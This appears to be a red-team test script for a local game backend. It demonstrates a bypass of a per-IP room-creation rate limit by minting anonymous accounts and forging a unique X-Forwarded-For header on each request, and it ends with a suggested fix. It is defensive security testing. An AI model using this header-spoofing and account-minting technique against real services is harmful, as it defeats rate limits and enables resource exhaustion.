// RED TEAM round 2 / session surface #6 — BYPASS of the blue-team fix for session_3.
//
// Round-1 finding (session_3): every throttle keys on the uid, and anonymous sign-in is free, so an outsider
// mints unlimited accounts and multiplies every per-user limit -> room/DB resource exhaustion.
//
// Blue-team fix (migration 20261026010000 + index.ts): room creation is ALSO rate-limited per CLIENT IP
// (rate_hit_ip, 11 creations / 2s), "not keyed on the uid, so minting accounts does not reset it". The blue
// team reports a hard ceiling (~11-22 rooms per burst) regardless of how many accounts are used.
//
// THE BYPASS: clientIp() in index.ts derives the key from `X-Forwarded-For.split(",")[0]` — the FIRST hop,
// which is fully attacker-controlled. The local gateway forwards the client-supplied header, so every request
// can carry a fresh, unique X-Forwarded-For and lands in its OWN empty IP bucket. The per-IP limiter never
// fires. Combined with free account minting, an outsider opens rooms without bound again — each one also
// writing a private.positions row — exactly the resource exhaustion the fix was meant to stop.
//
// Method: fire the SAME-size concurrent burst twice. Control = no spoof (one real gateway IP) -> the limiter
// throttles the burst. Attack = a unique forged X-Forwarded-For per request -> the limiter is defeated.
// Each account creates exactly ONE room here, so per-uid limits (5/600 create, 3 waiting rooms) never fire;
// any 429 is therefore the per-IP limiter, and its absence under spoofing is the bypass.
//
// Convention: EXPLOITED => throw (exit 1). BLOCKED => exit 0.
// (Retries absorb the local edge-runtime's transient 504/546 under concurrency; they are not attack signal.)
import { anon, call } from "../flow.test.ts";

const URL_ = process.env.SB_URL ?? "http://127.0.0.1:54321";
const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));
const TRANSIENT = new Set([502, 503, 504, 546]); // local-stack hiccups, not a rate-limit answer

async function anonR(tries = 6): Promise<string> {
  for (let i = 0; i < tries; i++) {
    try { return await anon(); } catch { await sleep(400 * (i + 1)); }
  }
  throw new Error("signup kept failing (local stack overloaded)");
}
async function createR(tok: string, xff?: string, tries = 4): Promise<number> {
  const extra = xff ? { "X-Forwarded-For": xff } : {};
  for (let i = 0; i < tries; i++) {
    const r = await call(tok, { action: "create", color: "white" }, extra);
    if (!TRANSIENT.has(r.status)) return r.status === 200 && r.body?.id ? 200 : r.status;
    await sleep(300 * (i + 1));
  }
  return 0; // gave up (transient) — counted as neither success nor throttle
}

// Mint `n` accounts gently up front, then fire ALL creates as one tight concurrent volley: the per-IP window
// is 11/2s, so only a single simultaneous volley lands inside one window and exercises the limiter. `spoof`
// => each request carries a unique forged source IP. (n stays <= 20, well under the 40-concurrent cap.)
async function burst(n: number, spoof: boolean): Promise<{ ok: number; throttled: number; dropped: number }> {
  const toks: string[] = [];
  for (let i = 0; i < n; i += 6) toks.push(...await Promise.all(Array.from({ length: Math.min(6, n - i) }, () => anonR())));
  let seq = 0;
  const res = await Promise.all(toks.map((t) => createR(t, spoof ? `198.51.100.${seq++}` : undefined)));
  let ok = 0, throttled = 0, dropped = 0;
  for (const s of res) { if (s === 200) ok++; else if (s === 429) throttled++; else if (s === 0) dropped++; }
  return { ok, throttled, dropped };
}

const N = 18;
const ctrl = await burst(N, false);
console.log(`control  (no spoof, ${N} creates, one real IP): opened ${ctrl.ok}, throttled ${ctrl.throttled}, dropped ${ctrl.dropped}`);
await sleep(2500); // let the per-IP fixed window (2s) roll over before the attack burst
const atk = await burst(N, true);
console.log(`attack   (unique forged X-Forwarded-For)       : opened ${atk.ok}, throttled ${atk.throttled}, dropped ${atk.dropped}`);

const limiterIsOn = ctrl.throttled > 0;                          // the per-IP limiter demonstrably fires without spoofing
const bypassed = atk.throttled === 0 && atk.ok >= ctrl.ok + 4;   // with spoofing it never fires, and far more rooms open

if (limiterIsOn && bypassed) {
  throw new Error(
    `PER-IP CREATE LIMIT BYPASSED via X-Forwarded-For spoofing. Same ${N}-request burst on one real IP was ` +
    `throttled (${ctrl.throttled} x 429, only ${ctrl.ok} rooms) — the limiter IS on. Forging a unique ` +
    `X-Forwarded-For per request opened ${atk.ok} rooms with ${atk.throttled} throttles. clientIp() trusts ` +
    `X-Forwarded-For.split(",")[0], attacker-controlled, so each request lands in its own empty IP bucket. ` +
    `With free anonymous account minting this reopens session_3 resource exhaustion (each room also writes a ` +
    `private.positions row). Fix: derive the client IP from the trusted hop only (never the client's first ` +
    `X-Forwarded-For entry) and/or cap creation globally. Endpoint: ${URL_}/functions/v1/game`);
}
console.log("\nX-Forwarded-For spoofing did NOT bypass the per-IP create limit — BLOCKED");
process.exit(0);
